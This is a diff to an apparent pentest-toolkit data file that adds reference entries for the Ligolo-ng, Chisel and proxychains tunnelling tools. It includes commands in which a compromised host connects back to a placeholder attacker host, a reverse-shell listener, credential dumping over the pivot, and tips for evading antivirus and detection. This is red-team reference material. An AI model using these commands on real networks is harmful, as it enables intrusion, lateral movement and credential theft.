@@ -9126,6 +9126,468 @@ var TOOLKIT = [
     ]
   },
   {
+    "category": "Pivoting & Tunnelling",
+    "tools": [
+      {
+        "id": "ligolo-ng",
+        "name": "Ligolo-ng",
+        "url": "https://github.com/nicocha30/ligolo-ng",
+        "description": "Tunnel into an internal network through a TUN interface — route a whole subnet via a compromised host, no SOCKS/proxychains required.",
+        "brief": "Ligolo-ng gives you a userland VPN-style pivot: a proxy runs on your attack box and an agent runs on the compromised host; the agent dials back over TLS and the proxy exposes the target's networks as a real tun interface on your machine.\n\nYou add a route for the internal subnet and every tool on your box reaches it natively — nmap SYN scans, raw sockets, the lot — with no proxychains in front. The agent needs no admin/root on the target (only the proxy side needs privileges, on your own box, to create the interface). Listeners forward ports back through the tunnel for reverse shells and file transfer. Values shown as <…> are placeholders.",
+        "quickReference": [
+          {
+            "label": "Proxy on your attack box (self-signed TLS)",
+            "cmd": "sudo ./proxy -selfcert   # listens on 0.0.0.0:11601"
+          },
+          {
+            "label": "Agent on the compromised host",
+            "cmd": "./agent -connect <attacker>:11601 -ignore-cert"
+          },
+          {
+            "label": "In the ligolo console — bring up the tunnel",
+            "cmd": "session            # pick the agent\ninterface_create --name ligolo\nroute_add --name ligolo --route 10.10.20.0/24\ntunnel_start --tun ligolo"
+          },
+          {
+            "label": "Now use any tool natively (no proxychains)",
+            "cmd": "nmap -sV -p445,3389 10.10.20.0/24"
+          }
+        ],
+        "sections": [
+          {
+            "title": "How it works",
+            "type": "notes",
+            "items": [
+              "Two parts: the proxy (attack box, interactive console) and the agent (compromised host, connects back). The agent makes an outbound TLS connection to the proxy on 11601, so it is egress-friendly and needs no inbound rule on the target.",
+              "Instead of a SOCKS proxy, the proxy presents the target's reachable networks as a tun interface on your machine. You create the interface, add a route for the internal CIDR, and start the tunnel — then your OS routes that subnet through the agent.",
+              "Because it is a real network interface, every tool works natively — including nmap SYN scans and anything using raw sockets, which SOCKS/proxychains cannot carry. A TCP connect on your box becomes a TCP connect from the agent.",
+              "Privilege: the AGENT needs no admin/root on the target. The PROXY needs root (or CAP_NET_ADMIN) on YOUR box to create the tun interface — that is local to you."
+            ]
+          },
+          {
+            "title": "Proxy & agent (setup)",
+            "type": "table",
+            "columns": [
+              "Side / flag",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "proxy -selfcert",
+                "Start the proxy with a dynamically generated self-signed cert (lab/quick use)"
+              ],
+              [
+                "proxy -laddr 0.0.0.0:11601",
+                "Listening address/port (default 11601; prefix https:// for a websocket listener)"
+              ],
+              [
+                "proxy -certfile / -keyfile",
+                "Use your own TLS cert/key instead of -selfcert"
+              ],
+              [
+                "agent -connect <attacker>:11601",
+                "Agent dials back to the proxy"
+              ],
+              [
+                "agent -ignore-cert",
+                "Skip TLS validation — needed with -selfcert (lab only)"
+              ],
+              [
+                "agent -accept-fingerprint <sha256>",
+                "Pin the proxy's cert fingerprint instead of ignoring it — the safe way (get it with certificate_fingerprint)"
+              ],
+              [
+                "agent -retry / -reconnect",
+                "Keep trying on initial failure / auto-reconnect if the link drops"
+              ],
+              [
+                "agent -proxy socks://… | http://…",
+                "Reach the proxy through an upstream SOCKS/HTTP proxy"
+              ]
+            ]
+          },
+          {
+            "title": "Console commands",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "session",
+                "Select the active agent session to operate on"
+              ],
+              [
+                "ifconfig",
+                "Show the agent's network interfaces — tells you which internal subnets it can reach"
+              ],
+              [
+                "interface_create --name ligolo",
+                "Create a local tun interface"
+              ],
+              [
+                "route_add --name ligolo --route <cidr>",
+                "Route an internal subnet through the tunnel (repeat per subnet)"
+              ],
+              [
+                "autoroute",
+                "Interactive helper: reads the agent's interfaces and sets up the tun + routes for you"
+              ],
+              [
+                "tunnel_start --tun ligolo",
+                "Start forwarding the selected session's traffic over the interface"
+              ],
+              [
+                "listener_add --addr 0.0.0.0:<p> --to 127.0.0.1:<p> --tcp",
+                "Open a listener ON THE AGENT that forwards back to your box (reverse shells, file pull)"
+              ],
+              [
+                "listener_list / listener_stop",
+                "Manage agent-side listeners"
+              ],
+              [
+                "certificate_fingerprint",
+                "Print the proxy's cert SHA256 — use it with the agent's -accept-fingerprint"
+              ]
+            ]
+          },
+          {
+            "title": "Common workflows",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Stand up the pivot end-to-end",
+                "cmd": "# 1) attack box (root, for the tun interface):\nsudo ./proxy -selfcert\n# 2) compromised host:\n./agent -connect <attacker>:11601 -ignore-cert\n# 3) in the ligolo console:\nsession                                   # select the agent\nifconfig                                  # see its internal subnets\ninterface_create --name ligolo\nroute_add --name ligolo --route 10.10.20.0/24\ntunnel_start --tun ligolo"
+              },
+              {
+                "label": "Use the internal network like it's local",
+                "cmd": "# no proxychains — full tooling works:\nnmap -sS -p- 10.10.20.5\nnxc smb 10.10.20.0/24 -u user -p pass\nevil-winrm -i 10.10.20.5 -u user -p pass"
+              },
+              {
+                "label": "Catch a reverse shell from an internal host",
+                "cmd": "# make the agent listen on the target and forward to YOUR handler:\nlistener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp\n# the internal victim connects to <agent_ip>:4444 -> it arrives at your 127.0.0.1:4444"
+              },
+              {
+                "label": "Double pivot (reach a deeper subnet)",
+                "cmd": "# run a second agent on a host inside 10.10.20.0/24, connect it back\n# through the first tunnel, then add another interface + route for 10.10.30.0/24\ninterface_create --name ligolo2\nroute_add --name ligolo2 --route 10.10.30.0/24\ntunnel_start --tun ligolo2"
+              }
+            ]
+          },
+          {
+            "title": "OPSEC & notes",
+            "type": "notes",
+            "items": [
+              "Pin the cert: run certificate_fingerprint on the proxy and start the agent with -accept-fingerprint <sha256> instead of -ignore-cert, so the TLS link can't be MITM'd.",
+              "The agent is a single static Go binary and needs no admin on the target — but it is large and signatured; drop it to a writable path, obfuscate/pack if AV is a concern, and remove it on cleanup.",
+              "Port 11601 and the long-lived outbound TLS session are the network signal — change the port, front the proxy with a redirector/real domain, and prefer -accept-fingerprint for real engagements.",
+              "Add only the routes you need (route_add per subnet); routing an over-broad CIDR through the tunnel can blackhole your own box's traffic.",
+              "Unlike SOCKS/proxychains, Ligolo carries SYN scans and raw sockets because it is a real interface — the main reason to reach for it over Chisel+proxychains on a complex internal network."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "Ligolo-ng — GitHub (nicocha30)",
+                "url": "https://github.com/nicocha30/ligolo-ng"
+              },
+              {
+                "label": "Toolkit — Chisel (SOCKS-based pivot)",
+                "url": "tool-detail.html?tool=chisel"
+              },
+              {
+                "label": "Toolkit — proxychains",
+                "url": "tool-detail.html?tool=proxychains"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "id": "chisel",
+        "name": "Chisel",
+        "url": "https://github.com/jpillora/chisel",
+        "description": "Fast TCP/UDP tunnel over HTTP, secured via SSH — reverse SOCKS proxy and port forwarding through one firewall-friendly port.",
+        "brief": "Chisel is a single-binary (Go) tunnel that multiplexes TCP/UDP over an HTTP connection secured with an SSH layer. One side runs as a server, the other as a client; because everything rides a single outbound HTTP(S) port it slips through egress filtering that blocks arbitrary ports.\n\nThe headline use on an engagement is a reverse SOCKS proxy: run the server on your attack box, run the client on a compromised host, and you get a SOCKS5 proxy on your box that routes into the target's internal network — then point proxychains or a browser at it. It also does explicit forward and reverse port-forwards. Values shown as <…> are placeholders; always set --auth on anything you expose.",
+        "quickReference": [
+          {
+            "label": "Server on your attack box (reverse mode)",
+            "cmd": "chisel server -p 8080 --reverse --socks5"
+          },
+          {
+            "label": "Client on the compromised host — reverse SOCKS",
+            "cmd": "chisel client <attacker>:8080 R:socks"
+          },
+          {
+            "label": "Point proxychains at the SOCKS proxy",
+            "cmd": "# SOCKS5 now on 127.0.0.1:1080 on your attack box\nproxychains -q nmap -sT -Pn -p445,3389 10.10.20.0/24"
+          },
+          {
+            "label": "Single reverse port-forward",
+            "cmd": "chisel client <attacker>:8080 R:13389:10.10.20.5:3389"
+          }
+        ],
+        "sections": [
+          {
+            "title": "How it works",
+            "type": "notes",
+            "items": [
+              "Two roles over one connection: one side is the server (listens for the HTTP tunnel), the other is the client (dials out). Traffic is multiplexed over a single HTTP(S) port and encrypted inside an SSH layer, so it survives egress filtering that only allows web ports.",
+              "Reverse vs forward is about which side opens the listening socket. A forward tunnel listens on the CLIENT; a reverse tunnel (the R: prefix) listens on the SERVER and routes into the client's network — which is what you want when the client is the compromised host and you're pivoting inward.",
+              "--reverse must be set on the SERVER to permit any R: tunnels from clients; without it the server refuses them.",
+              "A reverse SOCKS proxy (R:socks) is the most useful mode: it opens a SOCKS5 listener on the server (default 127.0.0.1:1080) that proxies arbitrary TCP into the compromised host's network — one tunnel, access to the whole subnet."
+            ]
+          },
+          {
+            "title": "Server (attack box)",
+            "type": "table",
+            "columns": [
+              "Flag",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "chisel server -p 8080 --reverse",
+                "Listen on 8080 and allow reverse (R:) tunnels from clients"
+              ],
+              [
+                "--socks5",
+                "Allow clients to open a reverse SOCKS5 proxy (R:socks)"
+              ],
+              [
+                "--auth <user>:<pass>",
+                "Require credentials — always set this on an exposed server"
+              ],
+              [
+                "--keyfile key.pem",
+                "Load a persistent host key (generate one with --keygen) so clients can pin it"
+              ],
+              [
+                "--tls-key / --tls-cert",
+                "Wrap the tunnel in real TLS — serve the pivot over HTTPS"
+              ],
+              [
+                "--host 0.0.0.0 / -p <port>",
+                "Bind address and port (-p is shorthand for --port)"
+              ]
+            ]
+          },
+          {
+            "title": "Client (compromised host)",
+            "type": "table",
+            "columns": [
+              "Tunnel spec / flag",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "R:socks",
+                "Reverse SOCKS5 — proxy on the server's 127.0.0.1:1080 into this host's network"
+              ],
+              [
+                "R:1080:socks",
+                "Same, but choose the SOCKS listen port on the server explicitly"
+              ],
+              [
+                "R:<lport>:<rhost>:<rport>",
+                "Reverse single forward — server:lport reaches rhost:rport from this host"
+              ],
+              [
+                "<lport>:<rhost>:<rport>",
+                "Forward tunnel — listen on the CLIENT, reach rhost:rport via the server"
+              ],
+              [
+                "--auth <user>:<pass>",
+                "Match the server's credentials"
+              ],
+              [
+                "--fingerprint <fp>",
+                "Verify the server's key (pin it — prevents a MITM on the tunnel)"
+              ],
+              [
+                "--keepalive 25s",
+                "Send keepalives so the tunnel survives idle NAT/firewall timeouts"
+              ]
+            ]
+          },
+          {
+            "title": "Common workflows",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Reverse SOCKS pivot (the usual one)",
+                "cmd": "# 1) attack box:\nchisel server -p 8080 --reverse --socks5 --auth op:<pass>\n# 2) compromised host (same auth):\nchisel client --auth op:<pass> <attacker>:8080 R:socks\n# 3) use it — SOCKS5 on 127.0.0.1:1080:\nproxychains -q nxc smb 10.10.20.0/24 -u user -p pass"
+              },
+              {
+                "label": "Expose one internal service to your box",
+                "cmd": "# reach internal RDP (10.10.20.5:3389) on your own 127.0.0.1:13389\n# client, on the compromised host:\nchisel client <attacker>:8080 R:13389:10.10.20.5:3389\nxfreerdp /v:127.0.0.1:13389 /u:user /p:pass"
+              },
+              {
+                "label": "Forward tunnel (reach an attacker-side service from the target)",
+                "cmd": "# make your box's :8000 reachable on the compromised host's 127.0.0.1:8000\nchisel client <attacker>:8080 8000:127.0.0.1:8000"
+              },
+              {
+                "label": "Run over HTTPS behind a redirector",
+                "cmd": "chisel server -p 443 --reverse --tls-key key.pem --tls-cert cert.pem --auth op:<pass>\nchisel client --auth op:<pass> https://<redirector>:443 R:socks"
+              }
+            ]
+          },
+          {
+            "title": "OPSEC & notes",
+            "type": "notes",
+            "items": [
+              "Always set --auth: an unauthenticated --reverse --socks5 server is an open proxy into your target's network for anyone who finds it.",
+              "Pin the server key with --fingerprint on the client so the tunnel can't be MITM'd; serve over real TLS (--tls-cert) and front it with a redirector for anything beyond a lab.",
+              "A single long-lived connection to an odd port plus a chisel process is the detection surface — use 443/HTTPS, a believable host via a redirector, and --keepalive so it reads like a normal long poll.",
+              "Chisel tunnels TCP (and UDP via U: specs). ICMP doesn't traverse it, so scans through the SOCKS proxy must be TCP connect (nmap -sT -Pn).",
+              "Drop the binary to a writable, non-flagged path and clean it up afterwards; the Go binary is large and signatured — pack/obfuscate or use a stripped static build where AV is a concern."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "Chisel — GitHub (jpillora)",
+                "url": "https://github.com/jpillora/chisel"
+              },
+              {
+                "label": "Toolkit — proxychains (consume the SOCKS proxy)",
+                "url": "tool-detail.html?tool=proxychains"
+              },
+              {
+                "label": "Toolkit — Ligolo-ng (TUN-based alternative)",
+                "url": "tool-detail.html?tool=ligolo-ng"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "id": "proxychains",
+        "name": "proxychains-ng",
+        "url": "https://github.com/rofl0r/proxychains-ng",
+        "description": "Force any program's TCP connections through a proxy (or a chain of them) — the standard way to drive tooling over a SOCKS pivot.",
+        "brief": "proxychains-ng (the maintained fork, usually the proxychains4 binary) hooks a program's network calls with an LD_PRELOAD shim and redirects its TCP connections through one or more proxies — most often a SOCKS5 proxy opened by Chisel, Ligolo, a Meterpreter/beacon socks module, or an SSH -D tunnel.\n\nIt turns \"I have a SOCKS proxy into the internal network\" into \"all my normal tools now reach the internal network.\" It is TCP-only and cannot carry ICMP or (normally) UDP, which shapes how you scan through it.",
+        "quickReference": [
+          {
+            "label": "Run a tool through the default config",
+            "cmd": "proxychains -q nmap -sT -Pn -p445,3389 10.10.20.5"
+          },
+          {
+            "label": "Use a specific config file",
+            "cmd": "proxychains -f ./pivot.conf impacket-secretsdump CORP/user@10.10.20.5"
+          },
+          {
+            "label": "Minimal config — one SOCKS5 proxy",
+            "cmd": "# /etc/proxychains4.conf\nstrict_chain\nproxy_dns\n[ProxyList]\nsocks5 127.0.0.1 1080"
+          }
+        ],
+        "sections": [
+          {
+            "title": "How it works",
+            "type": "notes",
+            "items": [
+              "proxychains preloads a library (LD_PRELOAD) that intercepts connect()/getaddrinfo() in the target program and reroutes its TCP through the configured proxies. It needs no privileges and no change to the program.",
+              "Config is read from ./proxychains.conf, then ~/.proxychains/proxychains.conf, then /etc/proxychains4.conf — or whatever you pass with -f. The binary is usually proxychains4; many distros also ship a proxychains symlink.",
+              "It is TCP-only: it cannot tunnel ICMP (no ping, no nmap -sn/-PE) and does not proxy UDP in general. DNS is the exception, handled specially via proxy_dns."
+            ]
+          },
+          {
+            "title": "Config file",
+            "type": "table",
+            "columns": [
+              "Directive",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "strict_chain",
+                "Route through every proxy in the list, in order; fail if any is down (default, predictable)"
+              ],
+              [
+                "dynamic_chain",
+                "Route through the listed proxies in order but skip dead ones — more resilient for a chain"
+              ],
+              [
+                "random_chain",
+                "Use a random proxy (or subset) per connection; pair with chain_len to set how many"
+              ],
+              [
+                "proxy_dns",
+                "Resolve DNS through the proxy — prevents DNS leaks and lets internal names resolve"
+              ],
+              [
+                "tcp_connect_time_out / tcp_read_time_out",
+                "Connect/read timeouts in ms — raise them over slow, high-latency tunnels"
+              ],
+              [
+                "quiet_mode",
+                "Suppress the per-connection [proxychains] log lines (same as -q)"
+              ],
+              [
+                "[ProxyList]",
+                "One proxy per line: 'socks5 <ip> <port> [user pass]', also socks4 / http"
+              ]
+            ]
+          },
+          {
+            "title": "Usage",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Scan through a SOCKS pivot (TCP connect only)",
+                "cmd": "# SYN/ICMP can't traverse a SOCKS proxy — force TCP connect + no ping:\nproxychains -q nmap -sT -Pn -n -p 22,445,3389,5985 10.10.20.0/24"
+              },
+              {
+                "label": "Drive AD tooling over the pivot",
+                "cmd": "proxychains -q nxc smb 10.10.20.0/24 -u user -p pass\nproxychains -q impacket-secretsdump CORP/user:pass@10.10.20.5\nproxychains -q evil-winrm -i 10.10.20.5 -u user -p pass"
+              },
+              {
+                "label": "Browse an internal web app",
+                "cmd": "proxychains -q firefox   # the browser's traffic now rides the pivot"
+              },
+              {
+                "label": "Per-engagement config without touching /etc",
+                "cmd": "proxychains4 -f ~/engagements/corp/pivot.conf -q <command>"
+              }
+            ]
+          },
+          {
+            "title": "Notes & gotchas",
+            "type": "notes",
+            "items": [
+              "Set proxy_dns so internal hostnames resolve through the tunnel and you don't leak lookups to your local resolver — but note it adds latency to every connection.",
+              "Scanning through proxychains is slow and must be TCP connect (-sT -Pn); keep port lists tight and prefer a tool with built-in concurrency (nxc, fscan) over a broad nmap sweep.",
+              "strict_chain with one proxy is the reliable default; use dynamic_chain when chaining multiple hops so one dead hop doesn't kill every connection.",
+              "Statically-linked binaries ignore LD_PRELOAD, so proxychains can't hook them (some Go tools) — use the tool's own --proxy/-x flag, or a TUN-based pivot (Ligolo-ng) instead.",
+              "Raise tcp_connect_time_out/tcp_read_time_out over a laggy multi-hop tunnel, or you'll get false 'closed' results."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "proxychains-ng — GitHub (rofl0r)",
+                "url": "https://github.com/rofl0r/proxychains-ng"
+              },
+              {
+                "label": "Toolkit — Chisel (open the SOCKS proxy)",
+                "url": "tool-detail.html?tool=chisel"
+              },
+              {
+                "label": "Toolkit — Ligolo-ng (no proxychains needed)",
+                "url": "tool-detail.html?tool=ligolo-ng"
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
     category: "Post Exploitation",
     tools: [
       {
